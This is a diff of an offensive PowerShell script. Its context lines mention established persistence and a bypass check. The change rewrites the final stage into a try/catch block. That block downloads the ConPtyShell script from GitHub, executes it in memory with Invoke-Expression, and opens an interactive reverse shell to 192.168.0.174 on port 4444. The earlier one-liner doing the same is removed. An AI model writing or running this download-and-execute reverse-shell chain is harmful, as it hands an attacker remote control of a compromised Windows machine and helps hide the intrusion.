@@ -106,9 +106,20 @@ try {
         
         Write-Host '[+] Persistence established'
 
-        # Download and execute ConPtyShell
-        IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); 
-        Invoke-ConPtyShell 192.168.0.174 4444
+                # Download and execute ConPtyShell
+                # Download and execute ConPtyShell
+        try {
+            Write-Host "[*] Downloading ConPtyShell..."
+            $conPtyUrl = "https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1"
+            $conPtyScript = (New-Object System.Net.WebClient).DownloadString($conPtyUrl)
+            Invoke-Expression $conPtyScript
+            
+            Write-Host "[*] Attempting to connect to 192.168.0.174:4444..."
+            Invoke-ConPtyShell 192.168.0.174 4444
+            Write-Host "[+] ConPtyShell connection successful"
+        } catch {
+            Write-Host "[!] ConPtyShell failed: $_"
+        }
     } else {
         Write-Host '[!] Bypass failed'
     }
